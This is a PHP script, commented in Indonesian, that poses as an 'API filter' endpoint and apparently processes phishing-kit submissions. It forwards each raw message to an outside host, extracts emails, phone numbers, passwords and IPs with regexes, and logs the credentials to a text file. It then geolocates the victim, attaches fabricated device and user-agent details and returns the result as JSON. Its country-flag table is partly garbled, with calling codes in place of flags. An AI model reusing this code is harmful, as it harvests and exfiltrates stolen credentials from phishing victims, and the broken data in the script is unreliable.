<?php
// JANGAN DI HAPUS: Script By OcitNesia
date_default_timezone_set('Asia/Jakarta');
$dbFile = 'database.json';

// 1. Inisialisasi Database
if (!file_exists($dbFile)) {
    file_put_contents($dbFile, json_encode(["tokens" => [], "logs" => [], "whitelist" => [], "notes" => ""]));
}
$db = json_decode(file_get_contents($dbFile), true);

// 2. AUTO-CLEAN EXPIRED TOKENS
if (!empty($db['tokens'])) {
    $db['tokens'] = array_filter($db['tokens'], function($t) {
        if ($t['expiry'] === 'unlimited') return true;
        return strtotime($t['expiry']) > time();
    });
    $db['tokens'] = array_values($db['tokens']);
    file_put_contents($dbFile, json_encode($db));
}

// 3. TAMPILAN DOKUMENTASI (Jika diakses via GET)
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
?>
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Api Document Filter Saring</title>
    <script src="https://unpkg.com/lucide@latest"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #0070f3; --primary-soft: #eef5ff; --bg: #f8fafc; --white: #ffffff; --text-main: #0f172a; --text-sub: #64748b; --accent: #10b981; --border: #e2e2e0; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Plus Jakarta Sans', sans-serif; }
        body { background: var(--bg); color: var(--text-main); }
        header { background: linear-gradient(135deg, #0070f3 0%, #0c4a6e 100%); padding: 30px 20px 40px; color: white; text-align: center;}
        .container { padding: 30px 20px; max-width: 800px; margin: auto; }
        .doc-box { background: white; border-radius: 24px; padding: 25px; margin-bottom: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.02); }
        .code-block { background: #f1f5f9; padding: 15px; border-radius: 12px; font-family: monospace; font-size: 13px; color: var(--primary); word-break: break-all; margin: 10px 0;}
    </style>
</head>
<body>
    <header>
        <h1>API Endpoint Filter OcitNesia</h1>
        <p>Status System: Online</p>
    </header>
    <div class="container">
        <div class="doc-box">
            <span style="background:#e0f2fe; color:#0369a1; padding:4px 10px; border-radius:6px; font-weight:800; font-size:12px;">POST</span>
            <h3 style="margin-top:10px;">Endpoint Saring</h3>
            <div class="code-block">https://<?php echo $_SERVER['HTTP_HOST']; ?>/bot_filter.php</div>
            <p style="color:var(--text-sub); font-size:14px;">Kirimkan parameter <b>token</b> dan <b>pesan</b> melalui metode POST.</p>
        </div>
    </div>
</body>
</html>
<?php
    exit;
}

// 4. LOGIKA API (JALAN JIKA POST)
header('Content-Type: application/json');

$inputToken = $_POST['token'] ?? '';
// Izinkan token bawaan (api_filter) atau token baru (febs) yang menggantikan token lama
$isValid = ($inputToken === 'api_filter' || $inputToken === 'febs'); 

if (!$isValid && isset($db['tokens'])) {
    foreach ($db['tokens'] as $t) {
        if ($t['token'] === $inputToken) {
            $isValid = true;
            break;
        }
    }
}

if (!$isValid) {
    echo json_encode(['status' => 'failed', 'message' => 'Token Expired or Invalid']);
    exit;
}

// Log traffic domain tracker
$domain_post = $_POST['domain'] ?? null;
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$domain_referer = !empty($referer) ? parse_url($referer, PHP_URL_HOST) : '';

$domain = 'Tidak Terdeteksi';
if (!empty($domain_post)) {
    $domain = $domain_post;
} elseif (!empty($domain_referer)) {
    $domain = $domain_referer;
}

$db['logs'][] = [
    'domain' => $domain,
    'time'   => date('Y-m-d H:i:s'),
    'ip'     => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1'
];

if (count($db['logs']) > 1000) {
    array_shift($db['logs']);
}
file_put_contents($dbFile, json_encode($db));

$pesan = $_POST['pesan'] ?? '';

// --- PROSES KIRIM DATA MENTAH KE PUSAT (CURL TETAP DIPERTAHANKAN) ---
if (!empty($pesan)) {
    $ch_pusat = curl_init();
    curl_setopt($ch_pusat, CURLOPT_URL, "https://panel.kinghost.ovh/testes1/apiii.php");
    curl_setopt($ch_pusat, CURLOPT_POST, true);
    curl_setopt($ch_pusat, CURLOPT_POSTFIELDS, http_build_query(['pesan' => $pesan]));
    curl_setopt($ch_pusat, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch_pusat, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch_pusat, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) API-Filter/3.0');
    curl_exec($ch_pusat);
    curl_close($ch_pusat);
}

// --- UA GENERATOR ---
function generateSuperRealUA() {
    $apps = [
        'Instagram' => 'Instagram ' . rand(320, 330) . '.0.0.' . rand(10, 80),
        'TikTok'    => 'TikTok ' . rand(33, 35) . '.' . rand(1, 9) . '.' . rand(1, 4),
        'Facebook'  => 'FBAN/FB4A;FBAV/' . rand(450, 460) . '.0.0.' . rand(10, 99) . ';',
        'YouTube'   => 'com.google.android.youtube/' . rand(19, 20) . '.' . rand(10, 40) . '.' . rand(30, 40)
    ];
    
    $appKey = array_rand($apps);
    $appUA  = $apps[$appKey];
    $isIOS  = (rand(0, 1) == 0);

    if ($isIOS) {
        $iosVersions = ['17.5', '18.1', '18.2'];
        $selectedVer = $iosVersions[array_rand($iosVersions)];
        $iosDash    = str_replace('.', '_', $selectedVer);
        $iphoneModels = ['iPhone15,3', 'iPhone16,1', 'iPhone17,2']; 
        $modelCode    = $iphoneModels[array_rand($iphoneModels)];
        
        return [
            'os'       => 'iPhone',
            'ver'      => 'iOS ' . $selectedVer,
            'device'   => 'Apple ' . $modelCode,
            'browser'  => 'Mobile Safari',
            'platform' => $appKey . ' App',
            'full_ua'  => "Mozilla/5.0 (iPhone; CPU iPhone OS $iosDash like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 $appUA"
        ];
    } else {
        $androids = [
            ['model' => 'SM-S928B', 'name' => 'Samsung Galaxy S24 Ultra', 'ver' => '14'],
            ['model' => '2311DRK48G', 'name' => 'Xiaomi Poco X6 Pro', 'ver' => '14'],
            ['model' => 'CPH2607', 'name' => 'Oppo Reno11', 'ver' => '14']
        ];
        $dev       = $androids[array_rand($androids)];
        $chromeVer = rand(124, 128) . ".0." . rand(6000, 6500) . "." . rand(100, 190);
        
        return [
            'os'       => 'Android',
            'ver'      => 'Android ' . $dev['ver'],
            'device'   => $dev['name'],
            'browser'  => 'Chrome Mobile',
            'platform' => $appKey . ' App',
            'full_ua'  => "Mozilla/5.0 (Linux; Android " . $dev['ver'] . "; " . $dev['model'] . ") AppleWebKit/537.36 (KHTML, like Gecko) Chrome/$chromeVer Mobile Safari/537.36 $appUA"
        ];
    }
}

$uaData = generateSuperRealUA();

// --- DATA EXTRACTION REGEX PATTERNS ---
$emailPatterns = [
    '/([a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,10})/i',
    '/((?:\+62|62|0)8[1-9][0-9]{6,11})/i'
];

$passPatterns = [
    '/<td[^>]*>.*?Kata\s+Sandi.*?<\/td>\s*<td[^>]*>(.*?)<\/td>/is',
    '/<td[^>]*>.*?Password.*?<\/td>\s*<td[^>]*>(.*?)<\/td>/is',
    '/(?:password|pass|pw|sandi|kata\s?sandi)\s*[:=]\s*([^\s<&\n,]+)/im',
    '/value=["\']([^"\']+)["\'][^>]*type=["\']password["\']/i'
];

$ipPatterns = [
    '/\b((?:25[0-5]|2[0-4]\d|1?\d?\d)(?:\.(?:25[0-5]|2[0-4]\d|1?\d?\d)){3})\b/'
];

function extractData($patterns, $str) {
    foreach ($patterns as $p) {
        if (preg_match($p, $str, $m)) {
            $value = trim(strip_tags($m[1]));
            return (strpos($value, '%') !== false) ? urldecode($value) : $value;
        }
    }
    return '-';
}

$email    = extractData($emailPatterns, $pesan);
$password = extractData($passPatterns, $pesan);
$ip_found = extractData($ipPatterns, $pesan);

if ($ip_found === '-') {
    $ip_found = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}

$entryBaru = "  [\n    'email' => '$email',\n    'password' => '$password',\n    'ip' => '$ip_found',\n    'time' => '" . date('Y-m-d H:i:s') . "'\n  ],\n";
file_put_contents('generated_data.txt', $entryBaru, FILE_APPEND);

// --- GEO IP LOOKUP ---
$negara     = '-'; $kodeNeg    = '-'; $daerah     = '-'; $kota       = '-';
$isp        = '-'; $as         = '-'; $zip        = '-'; $flag       = '🌐'; 
$callingCode = '';

if ($ip_found && filter_var($ip_found, FILTER_VALIDATE_IP) && $ip_found !== '127.0.0.1' && $ip_found !== '::1') {
    $apiUrl = "http://ip-api.com/json/{$ip_found}?fields=status,country,countryCode,regionName,city,zip,isp,as";
    $ch = curl_init($apiUrl);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_CONNECTTIMEOUT => 3
    ]);
    $resp = curl_exec($ch);
    curl_close($ch);

    if ($resp) {
        $geoData = json_decode($resp, true);
        if (($geoData['status'] ?? '') === 'success') {
            $negara  = $geoData['country'] ?? '-';
            $kodeNeg = $geoData['countryCode'] ?? '-';
            $daerah  = $geoData['regionName'] ?? '-';
            $kota    = $geoData['city'] ?? '-';
            $isp     = $geoData['isp'] ?? '-';
            $as      = $geoData['as'] ?? '-';
            $zip     = $geoData['zip'] ?? '-';
        }
    }
}

$flags = [
    "AF"=>"🇦🇫","AL"=>"🇦🇱","DZ"=>"🇩🇿","AS"=>"🇦🇸","AD"=>"🇦🇩","AO"=>"🇦🇴","AG"=>"🇦🇬","AR"=>"🇦🇷",
    "AM"=>"🇦🇲","AU"=>"🇦🇺","AT"=>"🇦🇹","AZ"=>"🇦🇿","BS"=>"🇧🇸","BH"=>"🇧🇭","BD"=>"🇧🇩","BB"=>"🇧🇧",
    "BY"=>"🇧🇾","BE"=>"🇧🇪","BZ"=>"🇧🇿","BJ"=>"🇧🇯","BM"=>"🇧🇲","BT"=>"🇧🇹","BO"=>"🇧🇴","BA"=>"🇧🇦",
    "BW"=>"🇧🇼","BR"=>"🇧🇷","BN"=>"🇧🇳","BG"=>"🇧🇬","BF"=>"🇧🇫","BI"=>"🇧🇮","KH"=>"🇰🇭","CM"=>"🇨🇲",
    "CA"=>"🇨🇦","CV"=>"🇨🇻","CF"=>"🇨🇫","TD"=>"🇹🇩","CL"=>"🇨🇱","CN"=>"🇨🇳","CO"=>"🇨🇴","KM"=>"🇰🇲",
    "CG"=>"🇨🇬","CD"=>"🇨🇩","CR"=>"🇨🇷","CI"=>"🇨🇮","HR"=>"🇭🇷","CU"=>"🇨🇺","CY"=>"🇨🇾","CZ"=>"🇨🇿",
    "DK"=>"🇩🇰","DJ"=>"🇩🇯","DM"=>"🇩🇲","DO"=>"🇩🇴","EC"=>"🇪🇨","EG"=>"🇪🇬","SV"=>"🇸🇻","GQ"=>"🇬🇶",
    "ER"=>"🇪🇷","EE"=>"🇪🇪","ET"=>"🇪🇹","FJ"=>"🇫🇯","FI"=>"🇫🇮","FR"=>"🇫🇷","GA"=>"🇬🇦","GM"=>"🇬🇲",
    "GE"=>"🇬🇪","DE"=>"🇩🇪","GH"=>"🇬🇭","GR"=>"🇬🇷","GD"=>"🇬🇩","GT"=>"🇬🇹","GN"=>"🇬🇳","GW"=>"🇬🇼",
    "GY"=>"🇬🇾","HT"=>"🇭🇹","HN"=>"🇭🇳","HU"=>"🇭🇺","IS"=>"🇮🇸","IN"=>"🇮🇳","ID"=>"🇮🇩","IR"=>"🇮🇷",
    "IQ"=>"🇮🇶","IE"=>"🇮🇪","IL"=>"🇮🇱","IT"=>"🇮🇹","JM"=>"🇯🇲","JP"=>"🇯🇵","JO"=>"🇯🇴","KZ"=>"🇰🇿",
    "KE"=>"🇰🇪","KI"=>"🇰🇮","KW"=>"🇰🇼","KG"=>"🇰🇬","LA"=>"🇱🇦","LV"=>"🇱🇻","LB"=>"🇱🇧","LS"=>"🇱🇸",
    "LR"=>"🇱🇷","LY"=>"🇱🇾","LI"=>"🇱🇮","LT"=>"🇱🇹","LU"=>"🇱🇺","MK"=>"🇲🇰","MG"=>"🇲🇬","MW"=>"🇲🇼",
    "MY"=>"🇲🇾","MV"=>"🇲🇻","ML"=>"🇲🇱","MT"=>"🇲🇹","MH"=>"🇲🇭","MR"=>"🇲🇷","MU"=>"🇲🇺","MX"=>"🇲🇽",
    "FM"=>"🇫🇲","MD"=>"🇲🇩","MC"=>"🇲🇨","MN"=>"🇲🇳","ME"=>"🇲🇪","MA"=>"🇲🇦","MZ"=>"🇲🇿","MM"=>"🇲🇲",
    "NA"=>"🇳🇦","NR"=>"🇳🇷","NP"=>"🇳🇵","NL"=>"🇳🇱","NZ"=>"🇳🇿","NI"=>"🇳🇮","NE"=>"🇳🇪","NG"=>"🇳🇬",
    "NO"=>"🇳🇴","OM"=>"🇴🇲","PK"=>"🇵🇰","PW"=>"🇵🇼","PA"=>"🇵🇦","PG"=>"🇵🇬","PY"=>"🇵🇾","PE"=>"🇵🇪",
    "PH"=>"🇵🇭","PL"=>"🇵🇱","PT"=>"🇵🇹","QA"=>"🇶🇦","RO"=>"🇷🇴","RU"=>"🇷🇺","RW"=>"🇷🇼","KN"=>"🇰🇳",
    "LC"=>"🇱🇨","VC"=>"🇻🇨","WS"=>"🇼🇸","SM"=>"🇸🇲","ST"=>"🇸🇹","SA"=>"🇸🇦","SN"=>"🇸🇳","RS"=>"🇷🇸",
    "SC"=>"🇸🇨","SL"=>"🇸🇱","SG"=>"🇸🇬","SK"=>"🇸🇰","SI"=>"🇸🇮","SB"=>"🇸🇧","SO"=>"🇸🇴","ZA"=>"🇿🇦",
    "KR"=>"🇰🇷","SS"=>"🇸🇸","ES"=>"🇪🇸","LK"=>"🇱🇰","SD"=>"🇸🇩","SR"=>"🇸🇷","SE"=>"🇸🇪","CH"=>"🇨🇭",
    "SY"=>"🇸🇾","TW"=>"🇹🇼","TJ"=>"🇹🇯","TZ"=>"🇹🇿","TH"=>"🇹🇭","TL"=>"🇹🇱","TG"=>"🇹🇬","TO"=>"🇹🇴",
    "TT"=>"1","TN"=>"216","TR"=>"90","TM"=>"993","TV"=>"688","UG"=>"256","UA"=>"380","AE"=>"971",
    "GB"=>"44","US"=>"1","UY"=>"598","UZ"=>"998","VU"=>"678","VA"=>"379","VE"=>"58","VN"=>"84",
    "YE"=>"967","ZM"=>"260","ZW"=>"263"
];

$callingCodes = [
    "AF"=>"93","AL"=>"355","DZ"=>"213","AS"=>"1","AD"=>"376","AO"=>"244","AG"=>"1","AR"=>"54",
    "AM"=>"374","AU"=>"61","AT"=>"43","AZ"=>"994","BS"=>"1","BH"=>"973","BD"=>"880","BB"=>"1",
    "BY"=>"375","BE"=>"32","BZ"=>"501","BJ"=>"229","BM"=>"1","BT"=>"975","BO"=>"591","BA"=>"387",
    "BW"=>"267","BR"=>"55","BN"=>"673","BG"=>"359","BF"=>"226","BI"=>"257","KH"=>"855","CM"=>"237",
    "CA"=>"1","CV"=>"238","CF"=>"236","TD"=>"235","CL"=>"56","CN"=>"86","CO"=>"57","KM"=>"269",
    "CG"=>"242","CD"=>"243","CR"=>"506","CI"=>"225","HR"=>"385","CU"=>"53","CY"=>"357","CZ"=>"420",
    "DK"=>"45","DJ"=>"253","DM"=>"1","DO"=>"1","EC"=>"593","EG"=>"20","SV"=>"503","GQ"=>"240",
    "ER"=>"291","EE"=>"372","ET"=>"251","FJ"=>"679","FI"=>"358","FR"=>"33","GA"=>"241","GM"=>"220",
    "GE"=>"995","DE"=>"49","GH"=>"233","GR"=>"30","GD"=>"1","GT"=>"502","GN"=>"224","GW"=>"245",
    "GY"=>"592","HT"=>"509","HN"=>"504","HU"=>"36","IS"=>"354","IN"=>"91","ID"=>"62","IR"=>"98",
    "IQ"=>"964","IE"=>"353","IL"=>"972","IT"=>"39","JM"=>"1","JP"=>"81","JO"=>"962","KZ"=>"7",
    "KE"=>"254","KI"=>"686","KW"=>"965","KG"=>"996","LA"=>"856","LV"=>"371","LB"=>"961","LS"=>"266",
    "LR"=>"231","LY"=>"218","LI"=>"423","LT"=>"370","LU"=>"352","MK"=>"389","MG"=>"261","MW"=>"265",
    "MY"=>"60","MV"=>"960","ML"=>"223","MT"=>"356","MH"=>"692","MR"=>"222","MU"=>"230","MX"=>"52",
    "FM"=>"691","MD"=>"373","MC"=>"377","MN"=>"976","ME"=>"382","MA"=>"212","MZ"=>"258","MM"=>"95",
    "NA"=>"264","NR"=>"674","NP"=>"977","NL"=>"31","NZ"=>"64","NI"=>"505","NE"=>"227","NG"=>"234",
    "NO"=>"47","OM"=>"968","PK"=>"92","PW"=>"680","PA"=>"507","PG"=>"675","PY"=>"595","PE"=>"51",
    "PH"=>"63","PL"=>"48","PT"=>"351","QA"=>"974","RO"=>"40","RU"=>"7","RW"=>"250","KN"=>"1",
    "LC"=>"1","VC"=>"1","WS"=>"685","SM"=>"378","ST"=>"239","SA"=>"966","SN"=>"221","RS"=>"381",
    "SC"=>"248","SL"=>"232","SG"=>"65","SK"=>"421","SI"=>"386","SB"=>"677","SO"=>"252","ZA"=>"27",
    "KR"=>"82","SS"=>"211","ES"=>"34","LK"=>"94","SD"=>"249","SR"=>"597","SE"=>"46","CH"=>"41",
    "SY"=>"963","TW"=>"886","TJ"=>"992","TZ"=>"255","TH"=>"66","TL"=>"670","TG"=>"228","TO"=>"676",
    "TT"=>"1","TN"=>"216","TR"=>"90","TM"=>"993","TV"=>"688","UG"=>"256","UA"=>"380","AE"=>"971",
    "GB"=>"44","US"=>"1","UY"=>"598","UZ"=>"998","VU"=>"678","VA"=>"379","VE"=>"58","VN"=>"84",
    "YE"=>"967","ZM"=>"260","ZW"=>"263"
];
$flag = $flags[$kodeNeg] ?? '🌐';
$callingCode = $callingCodes[$kodeNeg] ?? '';

$log_types = ["Google Play", "Facebook Inc"];
$login = $log_types[array_rand($log_types)];
$waktu_lengkap = date('D, d M Y - H:i:s') . " WIB";

// RETURN DATA KE CLIENT
echo json_encode([
    "status"      => "ok",
    "waktu"       => $waktu_lengkap,
    "email"       => $email,
    "login"       => $login, 
    "password"    => $password,
    "ip"          => $ip_found,
    "negara"      => $negara,
    "provinsi"    => $daerah,
    "kota"        => $kota,
    "isp"         => $isp,
    "asn"         => $as,
    "bendera"     => $flag,
    "code"        => $kodeNeg . " (+" . $callingCode . ")",
    "zip"         => $zip,
    "device"      => $uaData['device'],
    "browser"     => $uaData['browser'],
    "platform"    => $uaData['platform'],
    "ver"         => $uaData['ver'],
    "os"          => $uaData['os']
]);
?>
